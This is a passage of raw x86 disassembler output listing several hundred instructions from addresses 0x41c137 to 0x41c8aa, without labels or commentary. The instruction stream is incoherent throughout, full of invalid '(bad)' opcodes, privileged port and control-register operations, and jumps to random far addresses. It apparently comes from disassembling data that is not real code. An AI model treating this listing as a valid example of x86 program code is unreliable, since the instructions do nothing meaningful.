  41c137:	pop    ebp
  41c138:	sbb    al,dl
  41c13a:	push   eax
  41c13b:	in     al,0x34
  41c13d:	aas    
  41c13e:	icebp  
  41c13f:	dec    edi
  41c140:	ins    BYTE PTR es:[edi],dx
  41c141:	lods   eax,DWORD PTR ds:[esi]
  41c142:	test   BYTE PTR [eax-0x71],bl
  41c145:	pop    esp
  41c146:	mov    ds:0xccb4f155,eax
  41c14b:	push   edi
  41c14c:	mov    DWORD PTR [ebx-0x3d166d96],esp
  41c152:	jp     0x41c120
  41c154:	out    dx,al
  41c155:	stos   DWORD PTR es:[edi],eax
  41c156:	stos   BYTE PTR es:[edi],al
  41c157:	outs   dx,BYTE PTR ds:[esi]
  41c158:	jmp    0x3db7:0x9c6a10af
  41c15f:	mov    ds:0xd4f978d8,eax
  41c164:	ror    ebx,1
  41c166:	add    al,0x6
  41c168:	sub    esi,eax
  41c16a:	retf   
  41c16b:	mov    esi,0x7dc1a1d2
  41c170:	aaa    
  41c171:	add    ebp,0x6ca86446
  41c177:	sbb    cl,BYTE PTR [esi+eiz*2+0x37ecc5a2]
  41c17e:	fcmovnbe st,st(0)
  41c180:	invd   
  41c182:	in     al,0x82
  41c184:	adc    dl,bh
  41c186:	inc    edi
  41c187:	arpl   WORD PTR [ebx-0x51],si
  41c18a:	test   al,0xf4
  41c18c:	lds    eax,FWORD PTR [ebp+0x17]
  41c18f:	mov    ecx,0xc653e4bf
  41c194:	adc    BYTE PTR [esi+0x6d],0xd0
  41c198:	dec    eax
  41c199:	jge    0x41c1a9
  41c19b:	xchg   esi,eax
  41c19c:	lods   al,BYTE PTR ds:[esi]
  41c19d:	cli    
  41c19e:	fnstsw WORD PTR [edx+0x4a]
  41c1a1:	call   0x55df7b3f
  41c1a6:	sub    al,0xc4
  41c1a8:	jo     0x41c160
  41c1aa:	xlat   BYTE PTR ds:[ebx]
  41c1ab:	xchg   ecx,eax
  41c1ac:	das    
  41c1ad:	inc    ebx
  41c1ae:	addr16 mov bh,al
  41c1b1:	xor    edx,DWORD PTR [eax]
  41c1b3:	(bad)  
  41c1b4:	dec    ebp
  41c1b5:	mov    edi,edi
  41c1b7:	pop    ebp
  41c1b8:	jp     0x41c1d1
  41c1ba:	mov    al,0xa9
  41c1bc:	inc    esp
  41c1bd:	jb     0x41c199
  41c1bf:	clc    
  41c1c0:	and    al,0xe2
  41c1c2:	inc    edi
  41c1c3:	sub    BYTE PTR [eax-0x48],ch
  41c1c6:	addr16 add al,0x79
  41c1c9:	push   esi
  41c1ca:	sub    ah,BYTE PTR [esi-0x21]
  41c1cd:	xor    eax,0x6418942e
  41c1d2:	sbb    bl,cl
  41c1d4:	push   esi
  41c1d5:	add    edx,DWORD PTR [ecx]
  41c1d7:	jae    0x41c234
  41c1d9:	mov    DWORD PTR [ecx-0x18],ebx
  41c1dc:	cmp    al,0x7c
  41c1de:	cli    
  41c1df:	ss test al,0x87
  41c1e2:	test   DWORD PTR [edx],edi
  41c1e4:	std    
  41c1e5:	(bad)  
  41c1e6:	sbb    al,0x54
  41c1e8:	cmp    eax,0x90ec0442
  41c1ed:	stos   DWORD PTR es:[edi],eax
  41c1ee:	mov    bl,0xa4
  41c1f0:	or     al,0x1
  41c1f2:	ds mov ebp,0xd09b7378
  41c1f8:	xchg   DWORD PTR [ebx+0x66],edi
  41c1fb:	shr    BYTE PTR [eax],1
  41c1fd:	int    0xc4
  41c1ff:	inc    edi
  41c200:	add    al,0x6c
  41c202:	cdq    
  41c203:	repz pop esi
  41c205:	jbe    0x41c261
  41c207:	adc    al,0x3f
  41c209:	ja     0x41c1d4
  41c20b:	fnstsw WORD PTR [ecx]
  41c20d:	pop    edi
  41c20e:	ins    BYTE PTR es:[edi],dx
  41c20f:	lea    ecx,[eax+ecx*2-0x3a2c3ce7]
  41c216:	jl     0x41c25f
  41c218:	or     dl,BYTE PTR [edx]
  41c21a:	sbb    BYTE PTR [ebp+0xd36d5a5],bh
  41c220:	nop
  41c221:	xor    al,0x2f
  41c223:	and    BYTE PTR [bp+si-0x415b],bl
  41c228:	lods   al,BYTE PTR ds:[esi]
  41c229:	and    edi,DWORD PTR [ebp+0x26]
  41c22c:	sub    DWORD PTR [ebx+0x4a],ebx
  41c22f:	push   ecx
  41c230:	les    esi,FWORD PTR [ebp-0x275f1a5c]
  41c236:	jg     0x41c29d
  41c238:	(bad)  [eax-0x78ce4d62]
  41c23e:	pusha  
  41c23f:	ret    0xd0f1
  41c242:	scas   eax,DWORD PTR es:[edi]
  41c243:	arpl   WORD PTR [ecx+0x8],bp
  41c246:	sub    eax,0xf4f4e2ac
  41c24b:	mov    ch,ch
  41c24d:	ja     0x41c2c2
  41c24f:	lods   al,BYTE PTR ds:[esi]
  41c250:	scas   al,BYTE PTR es:[edi]
  41c251:	je     0x41c1f8
  41c253:	imul   ecx,esi,0x8327041b
  41c259:	pop    ds
  41c25a:	icebp  
  41c25b:	cmp    BYTE PTR [ebp-0x647aa51e],bl
  41c261:	pushf  
  41c262:	sar    edi,cl
  41c264:	out    0xc5,al
  41c266:	add    cl,cl
  41c268:	jecxz  0x41c2a2
  41c26a:	xor    cl,BYTE PTR [ebp-0x647e3633]
  41c270:	mov    eax,0x34ddffef
  41c275:	ret    
  41c276:	test   al,0xfc
  41c278:	cwde   
  41c279:	or     DWORD PTR [eax],edx
  41c27b:	imul   edi,DWORD PTR [edx+0x4e],0x86b4d7d2
  41c282:	push   edi
  41c283:	mov    eax,ds:0x90bea8b0
  41c288:	mov    ebx,0x4c5d0351
  41c28d:	imul   edi,DWORD PTR [edi+eiz*2],0x1a
  41c291:	sub    eax,0x99f409c1
  41c296:	mov    ah,0x82
  41c298:	push   es
  41c299:	call   0xc03f:0xb58ff2eb
  41c2a0:	jecxz  0x41c2b6
  41c2a2:	dec    esp
  41c2a3:	ins    BYTE PTR es:[edi],dx
  41c2a4:	outs   dx,DWORD PTR ds:[esi]
  41c2a5:	daa    
  41c2a6:	in     al,dx
  41c2a7:	add    DWORD PTR [ecx],eax
  41c2a9:	dec    esi
  41c2aa:	jno    0x41c308
  41c2ac:	pop    es
  41c2ad:	arpl   WORD PTR [eax-0x73d0143e],sp
  41c2b3:	sub    cl,BYTE PTR [eax+edi*4-0x767128c6]
  41c2ba:	sub    dh,dh
  41c2bc:	and    ah,ah
  41c2be:	sar    BYTE PTR [esp+ebx*4],0x85
  41c2c2:	push   edx
  41c2c3:	lock fnsave [eax+edi*2+0x438c6558]
  41c2cb:	inc    ebx
  41c2cc:	out    0x38,eax
  41c2ce:	jle    0x41c2e8
  41c2d0:	xchg   esi,eax
  41c2d1:	mov    esp,0x2af4872c
  41c2d6:	mov    ch,0x45
  41c2d8:	pusha  
  41c2d9:	cdq    
  41c2da:	pop    ecx
  41c2db:	inc    esp
  41c2dc:	aaa    
  41c2dd:	mul    ebp
  41c2df:	mov    ds:0xb62969ce,eax
  41c2e4:	add    esp,DWORD PTR [esi-0x70]
  41c2e7:	test   DWORD PTR [edi+0x19383afd],ecx
  41c2ed:	repz sub eax,0x24a1d277
  41c2f3:	pop    esp
  41c2f4:	cwde   
  41c2f5:	pop    esp
  41c2f6:	mov    ds:0xfdf1ebbe,eax
  41c2fb:	sbb    ch,BYTE PTR ds:0x6bf95f71
  41c301:	or     al,0xce
  41c303:	jl     0x41c2ea
  41c305:	in     eax,0xe3
  41c307:	jno    0x41c2d2
  41c309:	rol    ecx,0xe2
  41c30c:	adc    eax,0x22f43144
  41c311:	ins    BYTE PTR es:[edi],dx
  41c312:	ss (bad) 
  41c314:	mov    esp,DWORD PTR [edx-0x4d288297]
  41c31a:	inc    edi
  41c31b:	test   DWORD PTR [esi-0x80],0x30fc142f
  41c322:	daa    
  41c323:	push   ebx
  41c324:	mov    esi,0xf8c32b28
  41c329:	and    dh,BYTE PTR [esi+0x4f5709f4]
  41c32f:	sub    eax,0xef56ce0d
  41c334:	mov    ecx,0xd364c07d
  41c339:	scas   eax,DWORD PTR es:[edi]
  41c33a:	hlt    
  41c33b:	(bad)  
  41c33c:	or     eax,0xfd1b3407
  41c341:	sub    BYTE PTR [ebp+edi*1-0x19],dh
  41c345:	sbb    BYTE PTR ds:0x74083d23,0xaf
  41c34c:	pop    ds
  41c34d:	retf   0x64be
  41c350:	push   es
  41c351:	or     BYTE PTR [ebx],cl
  41c353:	dec    ebx
  41c354:	shr    ah,cl
  41c356:	jae    0x41c34e
  41c358:	fdiv   QWORD PTR [esi-0x29b31e8]
  41c35e:	adc    al,0x6f
  41c360:	cmp    BYTE PTR [esi-0x5b054617],dl
  41c366:	adc    ebp,ebp
  41c368:	shl    BYTE PTR [bp+di+0x1d0a],1
  41c36d:	stc    
  41c36e:	rcr    DWORD PTR ds:0x555fbab6,0x77
  41c375:	rcl    BYTE PTR [ebp+0x1e1194be],0x40
  41c37c:	xchg   ecx,eax
  41c37d:	bound  edi,QWORD PTR [edx]
  41c37f:	add    DWORD PTR [ebx-0x2ec62e6c],esi
  41c385:	cmp    eax,0xcab1b09e
  41c38a:	jno    0x41c3db
  41c38c:	sbb    DWORD PTR [eax],edi
  41c38e:	or     eax,0xbd1301c2
  41c393:	retf   
  41c394:	sar    DWORD PTR [edx+0x5f84f730],1
  41c39a:	ret    0x48e1
  41c39d:	inc    edx
  41c39e:	mov    eax,ds:0xcfb6d1ef
  41c3a3:	inc    eax
  41c3a4:	add    BYTE PTR [edi],al
  41c3a6:	mov    eax,0x5646d60f
  41c3ab:	iret   
  41c3ac:	mov    ch,0x41
  41c3ae:	call   0xd9f7:0x94a7f934
  41c3b5:	adc    BYTE PTR [edi-0x5a],ch
  41c3b8:	mov    ds:0x465b7942,al
  41c3bd:	fsub   QWORD PTR ds:0x8459beda
  41c3c3:	fsubr  QWORD PTR [eax+edx*2-0x4]
  41c3c7:	test   DWORD PTR [ecx],eax
  41c3c9:	test   al,0x2b
  41c3cb:	outs   dx,DWORD PTR ds:[esi]
  41c3cc:	adc    al,0xea
  41c3ce:	sub    ebx,DWORD PTR [ecx]
  41c3d0:	jecxz  0x41c41f
  41c3d2:	cmp    BYTE PTR [ecx],ch
  41c3d4:	shr    ecx,1
  41c3d6:	xlat   BYTE PTR ds:[ebx]
  41c3d7:	jmp    0x41c386
  41c3d9:	rcr    BYTE PTR [eax-0x2403c51b],0x87
  41c3e0:	adc    DWORD PTR [edx],esi
  41c3e2:	cmc    
  41c3e3:	fldcw  WORD PTR [edi+0x7d]
  41c3e6:	sub    edx,ebx
  41c3e8:	out    dx,eax
  41c3e9:	push   ds
  41c3ea:	aam    0x6d
  41c3ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ed:	out    0x67,eax
  41c3ef:	scas   al,BYTE PTR es:[edi]
  41c3f0:	ja     0x41c427
  41c3f2:	mov    ds,WORD PTR [ecx+0x5a8e0215]
  41c3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3f9:	and    ecx,DWORD PTR [edx-0x22]
  41c3fc:	stos   DWORD PTR es:[edi],eax
  41c3fd:	push   esi
  41c3fe:	and    esp,esp
  41c400:	retf   0xd60e
  41c403:	push   esp
  41c404:	pop    ds
  41c405:	add    ecx,DWORD PTR [ebx-0x64]
  41c408:	fsub   st,st(0)
  41c40a:	sub    cl,dh
  41c40c:	mov    eax,esp
  41c40e:	ror    dl,1
  41c410:	pop    es
  41c411:	pop    ss
  41c412:	imul   esi,DWORD PTR [edi],0xffffffe0
  41c415:	mov    fs,WORD PTR [edx+0x7626fb88]
  41c41b:	jne    0x41c3e1
  41c41d:	pop    ecx
  41c41e:	pop    ds
  41c41f:	or     eax,0xb3b35691
  41c424:	and    BYTE PTR ds:0xacffd332,ch
  41c42a:	pop    esp
  41c42b:	adc    eax,0x6eb30014
  41c430:	addr16 dec esp
  41c432:	aaa    
  41c433:	xchg   esp,eax
  41c434:	int    0xd6
  41c436:	sbb    eax,0xdfa60ec9
  41c43b:	mov    cr7,eax
  41c43e:	mov    cl,0xa4
  41c440:	ss je  0x41c4a7
  41c443:	fcomp  DWORD PTR [edi]
  41c445:	cwde   
  41c446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c447:	mov    esi,fs
  41c449:	push   esp
  41c44a:	dec    ecx
  41c44b:	outs   dx,BYTE PTR ds:[esi]
  41c44c:	jl     0x41c42d
  41c44e:	mov    ah,0x17
  41c450:	das    
  41c451:	test   DWORD PTR [ebp-0x1c],esp
  41c454:	mov    esp,0x33a4cbb
  41c459:	pop    es
  41c45a:	jbe    0x41c411
  41c45c:	cld    
  41c45d:	test   eax,0xd0069e4e
  41c462:	cld    
  41c463:	pop    ecx
  41c464:	xchg   dl,bh
  41c466:	call   0xe1e2:0xaafea14
  41c46d:	jle    0x41c420
  41c46f:	call   0xa2dd4d24
  41c474:	mov    esi,0xd70815ec
  41c479:	nop
  41c47a:	pop    ebx
  41c47b:	pop    es
  41c47c:	inc    edx
  41c47d:	push   edx
  41c47e:	adc    dh,dl
  41c480:	xchg   esi,eax
  41c481:	nop
  41c482:	cmp    DWORD PTR [ebx],ecx
  41c484:	xchg   esi,eax
  41c485:	aam    0x5e
  41c487:	rcr    ecx,1
  41c489:	das    
  41c48a:	jmp    0xcfb05e86
  41c48f:	pop    esi
  41c490:	ja     0x41c43f
  41c492:	mov    dh,0x30
  41c494:	call   0xb1326bac
  41c499:	xor    DWORD PTR [ebp+edx*1+0x6a27e167],esi
  41c4a0:	fiadd  WORD PTR [esi-0x4cb309ed]
  41c4a6:	dec    eax
  41c4a7:	cli    
  41c4a8:	xlat   BYTE PTR ds:[ebx]
  41c4a9:	pusha  
  41c4aa:	and    eax,0x24188dec
  41c4af:	xor    edx,esp
  41c4b1:	sar    DWORD PTR [edx+0x70],0x9b
  41c4b5:	int    0x6
  41c4b7:	mov    esp,0x4133a009
  41c4bc:	in     eax,0xb9
  41c4be:	aaa    
  41c4bf:	stos   DWORD PTR es:[edi],eax
  41c4c0:	and    BYTE PTR [eax+0x14],ah
  41c4c3:	(bad)  
  41c4c5:	loope  0x41c4f9
  41c4c7:	mov    WORD PTR [edi-0x144607f2],gs
  41c4cd:	sub    BYTE PTR [ebp-0x51],al
  41c4d0:	aad    0x53
  41c4d2:	mov    ch,0x70
  41c4d4:	mov    bl,0x6d
  41c4d7:	fsubr  QWORD PTR [eax]
  41c4d9:	dec    esi
  41c4da:	out    0xf,eax
  41c4dc:	mov    cl,0x3
  41c4de:	or     eax,0x6e6c1b89
  41c4e3:	cld    
  41c4e4:	sbb    BYTE PTR [ebx+0x65cf1396],ah
  41c4ea:	adc    al,0xec
  41c4ec:	jb     0x41c56c
  41c4ee:	add    ebp,ecx
  41c4f0:	xor    BYTE PTR [edx],ch
  41c4f2:	inc    esi
  41c4f3:	jbe    0x41c496
  41c4f5:	aad    0x85
  41c4f7:	or     DWORD PTR [ebp+0x7],edx
  41c4fa:	ja     0x41c483
  41c4fc:	fdivr  QWORD PTR [ecx+0x55]
  41c4ff:	xor    ch,BYTE PTR [ecx+0x11cd8014]
  41c505:	mov    eax,0xb6d6cafd
  41c50a:	jmp    0x12a91190
  41c50f:	in     eax,dx
  41c510:	sub    eax,0x280ef4bf
  41c515:	sbb    eax,0xc6a3d0fa
  41c51a:	and    ch,BYTE PTR [edi-0x6d]
  41c51d:	in     eax,dx
  41c51e:	push   es
  41c51f:	xchg   ecx,eax
  41c520:	fnstsw WORD PTR [edi-0x6e]
  41c523:	and    DWORD PTR [ebx+0x2184bdb5],0x8f93f610
  41c52d:	xchg   esp,eax
  41c52e:	mov    ds:0x8e94ac72,al
  41c533:	push   edx
  41c534:	std    
  41c535:	and    DWORD PTR [ebp-0x1bb3b6ce],edi
  41c53b:	cmp    eax,0xffeacac4
  41c540:	lods   al,BYTE PTR ds:[esi]
  41c541:	pop    edx
  41c542:	or     DWORD PTR [ebx],0x21cd315c
  41c548:	jb     0x41c596
  41c54a:	and    ebx,0x2b792bfc
  41c550:	inc    ebp
  41c551:	(bad)  
  41c552:	je     0x822238e4
  41c558:	push   edx
  41c559:	(bad)  
  41c55b:	retf   
  41c55c:	push   ds
  41c55d:	xor    al,0x60
  41c55f:	clc    
  41c560:	popa   
  41c561:	lds    eax,FWORD PTR [edi]
  41c563:	je     0x41c5d5
  41c565:	hlt    
  41c566:	sti    
  41c567:	retf   
  41c568:	pop    esi
  41c569:	mov    WORD PTR [edi],?
  41c56b:	shr    DWORD PTR [edx+edx*2-0x75e45799],cl
  41c572:	cld    
  41c573:	push   cs
  41c574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c575:	add    edi,DWORD PTR [esi]
  41c577:	fcmovnbe st,st(3)
  41c579:	adc    al,0xfd
  41c57b:	popf   
  41c57c:	and    DWORD PTR [edi],esi
  41c57e:	sbb    BYTE PTR [ecx+esi*8],dl
  41c581:	and    bl,ah
  41c583:	and    ah,bl
  41c585:	gs jg  0x41c5e2
  41c588:	xchg   edx,eax
  41c589:	mov    bh,BYTE PTR [ebx]
  41c58b:	add    edx,DWORD PTR [edi]
  41c58d:	push   ebp
  41c58e:	jmp    0x1492:0xdf7a6edf
  41c595:	push   eax
  41c596:	cs mov edi,0x3ee89f24
  41c59c:	and    eax,0x56c69bd1
  41c5a1:	jmp    0x41c54a
  41c5a3:	adc    esp,DWORD PTR [esi-0x57e209fc]
  41c5a9:	xchg   ecx,eax
  41c5aa:	mov    dl,0x9c
  41c5ac:	mov    eax,ds:0xd1c5c6c6
  41c5b1:	sar    BYTE PTR [ecx-0x4f28379b],1
  41c5b7:	inc    esi
  41c5b8:	fdivp  st(4),st
  41c5ba:	sub    eax,0x215f78e4
  41c5bf:	loope  0x41c56c
  41c5c1:	push   eax
  41c5c2:	test   dh,ah
  41c5c4:	loop   0x41c5c4
  41c5c6:	fimul  WORD PTR [edi]
  41c5c8:	pop    eax
  41c5c9:	inc    ebx
  41c5ca:	mov    ecx,0x7256f26
  41c5cf:	xlat   BYTE PTR ds:[ebx]
  41c5d0:	mov    dh,0x7b
  41c5d2:	je     0x41c562
  41c5d4:	lods   eax,DWORD PTR ds:[esi]
  41c5d5:	mov    al,ds:0x5f9e0753
  41c5da:	dec    BYTE PTR [edx+0x24]
  41c5dd:	call   0xacab:0x4f2339fd
  41c5e4:	push   0x41
  41c5e6:	xor    edx,DWORD PTR ds:0x5d71af04
  41c5ec:	sub    BYTE PTR [eax-0x22843ffd],ah
  41c5f2:	ss jmp 0x41c5ff
  41c5f5:	mov    BYTE PTR [eax],bh
  41c5f7:	loope  0x41c5e3
  41c5f9:	add    DWORD PTR [ecx],0x57
  41c5fc:	scas   al,BYTE PTR es:[edi]
  41c5fd:	in     al,0xdb
  41c5ff:	arpl   ax,si
  41c601:	(bad)  
  41c602:	mov    bl,0xba
  41c604:	imul   eax,DWORD PTR [edx+edi*4-0x283a8201],0x862d8c87
  41c60f:	push   ebp
  41c610:	aaa    
  41c611:	cmp    DWORD PTR [edx],edx
  41c613:	pop    ds
  41c614:	loop   0x41c5b0
  41c616:	loop   0x41c5a8
  41c618:	test   BYTE PTR [esi],0xab
  41c61b:	cmp    eax,ebx
  41c61d:	sub    dl,BYTE PTR [ebx-0x6a]
  41c620:	jae    0x41c5e2
  41c622:	mov    bl,0xbe
  41c624:	shl    bh,0xd9
  41c627:	repnz cli 
  41c629:	leave  
  41c62a:	and    ebp,DWORD PTR [ebp+0x5e89b672]
  41c630:	mov    WORD PTR [edx+0x35195349],?
  41c636:	scas   eax,DWORD PTR es:[edi]
  41c637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c638:	sbb    BYTE PTR [ebx],0xfb
  41c63b:	in     al,0x96
  41c63d:	sbb    DWORD PTR [ebx],eax
  41c63f:	retf   
  41c640:	in     al,dx
  41c641:	and    al,0x7b
  41c643:	in     al,dx
  41c644:	(bad)  
  41c645:	ins    DWORD PTR es:[edi],dx
  41c646:	les    edi,FWORD PTR [ebp-0x2c]
  41c649:	mov    ch,0xa4
  41c64b:	stos   BYTE PTR es:[edi],al
  41c64c:	xchg   ebx,eax
  41c64d:	popa   
  41c64e:	shl    BYTE PTR [ebp+0x5aabd884],0xfa
  41c655:	xor    ebx,DWORD PTR [eax-0x80]
  41c658:	jp     0x41c5dd
  41c65a:	call   0xf7c216c9
  41c65f:	cmp    BYTE PTR [edi],0xa4
  41c662:	pushf  
  41c663:	dec    ecx
  41c664:	push   0x57
  41c666:	loope  0x41c69c
  41c668:	sub    al,0x3e
  41c66a:	enter  0x338a,0x71
  41c66e:	bound  ebx,QWORD PTR [edi+0x457e8e02]
  41c674:	aaa    
  41c675:	das    
  41c676:	adc    al,BYTE PTR [eax+eiz*2]
  41c679:	aam    0x61
  41c67b:	add    edi,DWORD PTR cs:[ebx+0x55]
  41c67f:	add    DWORD PTR [edx-0x7d],ebx
  41c682:	xor    DWORD PTR ds:0x8364d2b8,ecx
  41c688:	cmc    
  41c689:	gs push ds
  41c68b:	mov    WORD PTR [ebx+ebx*8-0x74],?
  41c68f:	and    edx,eax
  41c691:	mov    cl,0xfc
  41c693:	jle    0x41c6cc
  41c695:	cs xchg ecx,eax
  41c697:	sar    DWORD PTR [ebp+esi*4+0x4788bf4a],0x33
  41c69f:	adc    BYTE PTR [eax-0x7844f122],cl
  41c6a5:	pop    ebx
  41c6a6:	sbb    al,0xac
  41c6a8:	and    ebp,0x1b
  41c6ab:	sahf   
  41c6ac:	xchg   ebx,eax
  41c6ad:	push   ecx
  41c6ae:	loop   0x41c6ae
  41c6b0:	pushf  
  41c6b1:	cwde   
  41c6b2:	call   0xd542d56c
  41c6b7:	fstp   TBYTE PTR [esp+edx*4]
  41c6ba:	cmp    eax,0x5634eeb1
  41c6bf:	mov    ecx,0x8c2d0c2d
  41c6c4:	xor    ebp,DWORD PTR [edx]
  41c6c6:	pop    edx
  41c6c7:	outs   dx,BYTE PTR ds:[esi]
  41c6c8:	jae    0x41c712
  41c6ca:	scas   al,BYTE PTR es:[edi]
  41c6cb:	push   ds
  41c6cc:	mov    edx,DWORD PTR [ecx]
  41c6ce:	into   
  41c6cf:	pop    es
  41c6d0:	xor    eax,0x5dd664ee
  41c6d5:	(bad)  
  41c6d6:	aad    0x3c
  41c6d8:	rcl    DWORD PTR [edi],1
  41c6da:	mov    ebx,0x32426c1a
  41c6df:	add    edx,0xffffffde
  41c6e2:	push   es
  41c6e3:	mov    eax,0x82475642
  41c6e8:	scas   al,BYTE PTR es:[edi]
  41c6e9:	inc    ebx
  41c6ea:	sbb    eax,0x152bd6f
  41c6ef:	mov    ebp,0xf01ed12c
  41c6f4:	dec    esp
  41c6f5:	mov    BYTE PTR [esi+0x1],al
  41c6f8:	push   ebp
  41c6f9:	xor    BYTE PTR [esi],ah
  41c6fb:	sbb    eax,0x3b1062e6
  41c700:	cmp    edx,DWORD PTR [esi+0x7c896597]
  41c706:	pop    edx
  41c707:	pop    eax
  41c708:	fcomp  DWORD PTR [ecx-0x5a]
  41c70b:	and    al,0xee
  41c70d:	mov    DWORD PTR [edi],0x78d95084
  41c713:	jle    0x41c71c
  41c715:	neg    DWORD PTR [esi-0x2848b227]
  41c71b:	in     eax,0x23
  41c71d:	xchg   DWORD PTR [edx-0x536f17b6],ecx
  41c723:	retf   0xcffd
  41c726:	xchg   ebx,eax
  41c727:	sti    
  41c728:	mov    ds:0x4c0055b3,al
  41c72d:	repz in ax,0xb3
  41c731:	es in  al,dx
  41c733:	dec    ecx
  41c734:	rcl    BYTE PTR ds:0x1b80a312,0xd8
  41c73b:	ret    
  41c73c:	hlt    
  41c73d:	arpl   WORD PTR ss:0x26524858,dx
  41c744:	stos   DWORD PTR es:[edi],eax
  41c745:	add    BYTE PTR [esi+0x15f9b8f5],0x1
  41c74c:	jno    0x41c701
  41c74e:	js     0x41c746
  41c750:	xor    esp,DWORD PTR [ebp-0x6e2eb7e6]
  41c756:	ret    0x2372
  41c759:	lods   eax,DWORD PTR ds:[esi]
  41c75a:	xor    ch,cl
  41c75c:	adc    eax,0x3d88c6e7
  41c761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c762:	cld    
  41c763:	fcmovbe st,st(3)
  41c765:	xor    cl,0x7c
  41c768:	add    dl,BYTE PTR [ebx]
  41c76a:	imul   ebp,DWORD PTR [eax+0x4f],0xfceea6f1
  41c771:	push   ebp
  41c772:	pop    ebp
  41c773:	add    BYTE PTR [esi+0x439e2cd5],ch
  41c779:	pop    ds
  41c77a:	jo     0x41c78a
  41c77c:	jo     0x41c767
  41c77e:	pop    ds
  41c77f:	das    
  41c780:	adc    dl,BYTE PTR [edi]
  41c782:	lods   al,BYTE PTR ds:[esi]
  41c783:	push   ecx
  41c784:	inc    eax
  41c785:	ret    
  41c786:	mov    ah,0xc1
  41c788:	stos   BYTE PTR es:[edi],al
  41c789:	pop    edi
  41c78a:	inc    esp
  41c78b:	arpl   WORD PTR [eax+0x4c],bp
  41c78e:	retf   
  41c78f:	add    cl,BYTE PTR [ecx-0x5fcbfe91]
  41c795:	jl     0x41c7d9
  41c797:	or     BYTE PTR [esi],al
  41c799:	cmp    cl,BYTE PTR [edx+edx*1+0x5e]
  41c79d:	xchg   ebp,eax
  41c79e:	jecxz  0x41c75e
  41c7a0:	sbb    al,0x51
  41c7a2:	retf   0x16ac
  41c7a5:	(bad)  
  41c7a7:	inc    esi
  41c7a8:	call   FWORD PTR [ebx]
  41c7aa:	jle    0x41c750
  41c7ac:	xchg   edx,eax
  41c7ad:	sbb    DWORD PTR [eax+0x50127f00],0xfffffff4
  41c7b4:	cli    
  41c7b5:	pop    eax
  41c7b6:	cmp    cl,BYTE PTR [ebx]
  41c7b8:	in     al,dx
  41c7b9:	(bad)  
  41c7ba:	xchg   ebx,eax
  41c7bb:	dec    esp
  41c7bc:	into   
  41c7bd:	shl    BYTE PTR [ebp+0x63],0x53
  41c7c1:	mov    BYTE PTR [edx+0x36ea1d01],dl
  41c7c7:	iret   
  41c7c8:	jns    0x41c7f5
  41c7ca:	xor    DWORD PTR [ebx+0x378000ca],edx
  41c7d0:	adc    esi,DWORD PTR [ecx-0x6b]
  41c7d3:	mov    esp,0x1ce77149
  41c7d8:	adc    al,0xe5
  41c7da:	aas    
  41c7db:	sbb    al,0x17
  41c7dd:	(bad)  
  41c7de:	in     al,0x52
  41c7e0:	add    al,0xc6
  41c7e2:	ins    BYTE PTR es:[edi],dx
  41c7e3:	and    ah,0x47
  41c7e6:	dec    ecx
  41c7e7:	and    eax,0x25ae1151
  41c7ec:	sbb    DWORD PTR [ecx-0x5c],esi
  41c7ef:	and    DWORD PTR [edi+ebx*1+0x45],esi
  41c7f3:	popa   
  41c7f4:	mov    esi,0xa68b8503
  41c7f9:	push   cs
  41c7fa:	ds pop ds
  41c7fc:	test   ebp,ebp
  41c7fe:	jmp    0x24ccbecd
  41c803:	dec    edi
  41c804:	ins    BYTE PTR es:[edi],dx
  41c805:	adc    eax,0x277f8dd4
  41c80a:	mov    ecx,0xb5c4d50a
  41c80f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c810:	loopne 0x41c7e0
  41c812:	xchg   esp,eax
  41c813:	xor    BYTE PTR [esi],cl
  41c815:	lods   al,BYTE PTR ds:[esi]
  41c816:	sar    dh,cl
  41c818:	xor    ebp,eax
  41c81a:	mov    ah,0x12
  41c81c:	pop    esi
  41c81d:	push   ebp
  41c81e:	inc    ebx
  41c81f:	xchg   ebx,eax
  41c820:	mov    edx,DWORD PTR [ecx+0x33407464]
  41c826:	out    dx,al
  41c827:	adc    ch,al
  41c829:	cmp    BYTE PTR [edx],ah
  41c82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c82c:	xchg   ebp,eax
  41c82d:	ja     0x41c8ac
  41c82f:	add    DWORD PTR [ecx],edi
  41c831:	mov    ds:0x36919a15,eax
  41c836:	xchg   ebx,eax
  41c837:	adc    DWORD PTR ds:0xd8a9d993,eax
  41c83d:	jb     0x41c81f
  41c83f:	xor    dl,BYTE PTR ds:0xa6d0e7f6
  41c845:	add    DWORD PTR [edi],0xffffffd8
  41c848:	ins    DWORD PTR es:[edi],dx
  41c849:	xchg   esp,eax
  41c84a:	xor    edx,eax
  41c84c:	arpl   WORD PTR [edx+eiz*4-0x74b7b72d],bp
  41c853:	xor    bl,BYTE PTR [edx]
  41c855:	xchg   BYTE PTR [ebx+0x2355f1f6],dl
  41c85b:	mov    bl,0x7e
  41c85d:	loop   0x41c878
  41c85f:	imul   edi,ebx,0x2
  41c862:	loope  0x41c879
  41c864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c865:	adc    ecx,DWORD PTR [edi]
  41c867:	jo     0x41c832
  41c869:	or     bh,al
  41c86b:	push   esp
  41c86c:	dec    ecx
  41c86d:	adc    eax,0x9381ea21
  41c872:	add    dh,BYTE PTR [ebp+0x62]
  41c875:	cmp    ebx,DWORD PTR [ebx-0x41]
  41c878:	aaa    
  41c879:	rep outs dx,BYTE PTR ds:[esi]
  41c87b:	mov    ebx,0xb7a22f8a
  41c880:	ins    DWORD PTR es:[edi],dx
  41c881:	imul   ebx,DWORD PTR [ecx+0x3e],0x4d67612a
  41c888:	add    al,0x4f
  41c88a:	jnp    0x41c848
  41c88c:	in     al,0xd5
  41c88e:	mov    ebp,0x22e898c5
  41c893:	outs   dx,DWORD PTR ds:[esi]
  41c894:	add    ecx,DWORD PTR [ecx-0x20]
  41c897:	mov    cs:0x7e9ea4f2,eax
  41c89d:	loope  0x41c898
  41c89f:	jne    0x41c852
  41c8a1:	xchg   ebx,eax
  41c8a2:	inc    DWORD PTR [ebx]
  41c8a4:	mov    ch,0xe0
  41c8a6:	leave  
  41c8a7:	and    ecx,DWORD PTR [esi-0x3a]
  41c8aa:	neg    esi
